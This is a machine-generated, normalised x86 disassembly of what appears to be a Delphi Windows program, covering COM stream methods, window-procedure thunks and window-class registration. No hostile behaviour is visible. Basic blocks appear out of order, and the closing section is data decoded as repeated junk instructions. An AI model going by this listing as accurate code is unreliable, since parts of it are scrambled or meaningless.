jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41a128
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419ed4
push ebx
push sub_419efc
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419ee8
push ebx
push sub_419f08
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41a220
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407fcc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41a2b8
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
sub_41a2b8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4143bc
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407fcc
test al al
jne r-xdata
sub_41a308
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4044a0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_408150
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
xor edx edx
mov eax ebx
call sub_41a488
mov edx esi
mov eax ebx
call sub_41a394
mov dl 0x1
mov eax ebx
call sub_41a488
sub_41a3a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4143bc
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4142f8
sub_41a3e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_414418
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41425c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_414438
sub_41a438
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41a3d4
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41a3a8
mov cl 0x1
mov edx ebx
call sub_41a438
inc edi
dec ebp
jne r-xdata
sub_41a488
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404330
mov edx esp
mov eax esi
call sub_403618
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41a4d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41a4f8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41a540
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4033f8
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a580
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a5a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a5c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41a60c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
mov edx esi
call sub_41a83c
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41a674
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41a83c
mov edx ebx
mov eax esi
call sub_41a830
sub_41a6b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419db0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41a6fc
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419dfc
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41a0b0
jmp r-xdata
mov eax esi
call sub_4144a4
mov edx eax
mov eax edi
call sub_41a83c
lea eax [ edi + 0x50 ]
call sub_40d6a0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_41a75c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41a0cc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41a788
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41a7a4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41a7c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4143bc
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41a83c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41425c
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4143bc
cmp ebp eax
jne r-xdata
sub_41a87c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41a0b0
mov edx ebx
call sub_419e80
sub_41a8a8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41a8f0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403344
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41a928
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a977
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a990
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a9df
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a9f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41aa62
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41aa7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41aac5
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_4160d4
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41aae0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405854
xor eax eax
push ebp
push sub_41accd
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41aca6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026f4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41ac95
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402714
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403b7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41acd4
lea eax [ ebp + 0xc ]
call sub_4057e0
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403b7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41ad10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41ad73
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41ada4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_414764
mov edi eax
xor eax eax
push ebp
push sub_41adf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ae00
mov eax [ rw-data ]
call sub_4147c8
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4143bc
call sub_403344
inc esi
dec ebx
jne r-xdata
sub_41ae18
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41ae40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028f0
mov edx sub_41ae18
lea eax [ esi + 0x5 ]
call sub_41ae38
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41ae38
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41aefc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406ccc
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ae40
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41afb0
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41aed8
sub_41afd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41b07c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b083
retn
mov eax [ rw-data ]
call sub_413b5c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41ada4
xor edx edx
xor eax eax
call sub_416fd4
mov eax rw-data
call sub_40d6a0
call sub_405f10
lea eax [ eax + 0xc ]
call sub_40d6a0
mov eax rw-data
call sub_40d6a0
mov eax rw-data
call sub_4057e0
mov eax sub_41ae10
call sub_40567c
mov eax rw-data
call sub_40d6a0
call sub_419bd0
mov eax rw-data
call sub_40d6a0
mov eax rw-data
call sub_4057e0
sub_41b088
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41b111
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b118
retn
call sub_419b9c
mov eax sub_41ae10
call sub_405674
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d3e0
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4057f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_413424
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41460c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41460c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41b11c
inc esi
dec ecx
add [ eax - 0x1 ] dh
add [ eax ] al
inc esi
dec ecx
add [ ecx - 0x1 ] dh
add [ eax ] al
inc esi
dec ecx
add [ edx - 0x1 ] dh
add [ eax ] al
inc esi
dec ecx
add [ ebx - 0x1 ] dh
add [ eax ] al
inc esi
dec ecx
add [ edi + edi * 8 ] dh
add [ esi + eax * 2 + 0x49 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
inc esi
dec ecx
add [ esi - 0x1 ] dh
add [ eax ] al
inc esi
dec ecx
add [ edi - 0x1 ] dh
add [ eax ] al
inc esi
dec ecx
add [ eax - 0x1 ] bh
add [ eax ] al
inc esi
dec ecx
add [ ecx - 0x1 ] bh
add [ eax ] al
inc esi
dec ecx
add [ edx - 0x1 ] bh
add [ eax ] al
inc esi
dec ecx
add [ ebx - 0x1 ] bh
add [ eax ] al
inc esi
dec ecx
add [ edi + edi * 8 ] bh
add [ esi + eax * 2 + 0x49 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
inc esi
dec ecx
add [ esi - 0x1 ] bh
add [ eax ] al
inc esi
dec ecx
add [ edi - 0x1 ] bh
add [ eax ] al
inc esi
dec ecx
add [ eax - 0x1 ] ah
add [ eax ] al
inc esi
dec ecx
add [ ecx - 0x1 ] ah
add [ eax ] al
inc esi
dec ecx
add [ edx - 0x1 ] ah
add [ eax ] al
inc esi
dec ecx
add [ ebx - 0x1 ] ah
add [ eax ] al
inc esi
dec ecx
add [ edi + edi * 8 ] ah
add [ esi + eax * 2 + 0x49 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
inc esi
dec ecx
add [ esi - 0x1 ] ah
add [ eax ] al
inc esi
dec ecx
add [ edi - 0x1 ] ah
add [ eax ] al
inc esi
dec ecx
add [ eax - 0x1 ] ch
add [ eax ] al
inc esi
dec ecx
add [ ecx - 0x1 ] ch
add [ eax ] al
inc esi
dec ecx
add [ edx - 0x1 ] ch
add [ eax ] al
inc esi
dec ecx
add [ ebx - 0x1 ] ch
add [ eax ] al
inc esi
dec ecx
add [ edi + edi * 8 ] ch
add [ esi + eax * 2 + 0x49 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
inc esi
dec ecx
add [ esi - 0x1 ] ch
add [ eax ] al
inc esi
dec ecx
add [ edi - 0x1 ] ch
add [ eax ] al
inc esi
dec ecx
add [ eax - 0x1 ] dl
add [ eax ] al
inc esi
dec ecx
add [ ecx - 0x1 ] dl
add [ eax ] al
inc esi
dec ecx
add [ edx - 0x1 ] dl
add [ eax ] al
inc esi
dec ecx
add [ ebx - 0x1 ] dl
add [ eax ] al
inc esi
dec ecx
add [ edi + edi * 8 ] dl
add [ esi + eax * 2 + 0x49 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
inc esi
dec ecx
add [ esi - 0x1 ] dl
add [ eax ] al
inc esi
dec ecx
add [ edi - 0x1 ] dl
add [ eax ] al
inc esi
dec ecx
add [ eax - 0x1 ] bl
add [ eax ] al
inc esi
dec ecx
add [ ecx - 0x1 ] bl
add [ eax ] al
inc esi
dec ecx
add [ edx - 0x1 ] bl
add [ eax ] al
inc esi
dec ecx
add [ ebx - 0x1 ] bl
add [ eax ] al
inc esi
dec ecx
add [ edi + edi * 8 ] bl
add [ esi + eax * 2 + 0x49 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
inc esi
dec ecx
add [ esi - 0x1 ] bl
add [ eax ] al
inc esi
dec ecx
add [ edi - 0x1 ] bl
add [ eax ] al
inc esi
dec ecx
add [ eax - 0x1 ] al
add [ eax ] al
inc esi
dec ecx
add [ ecx - 0x1 ] al
add [ eax ] al
inc esi
dec ecx
add [ edx - 0x1 ] al
add [ eax ] al
inc esi
dec ecx
add [ ebx - 0x1 ] al
add [ eax ] al
inc esi
dec ecx
add [ edi + edi * 8 ] al
add [ esi + eax * 2 + 0x49 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
inc esi
dec ecx
add [ esi - 0x1 ] al
add [ eax ] al
inc esi
dec ecx
add [ edi - 0x1 ] al
add [ eax ] al
inc esi
dec ecx
add [ eax - 0x1 ] cl
add [ eax ] al
inc esi
dec ecx
add [ ecx - 0x1 ] cl
add [ eax ] al
inc esi
dec ecx
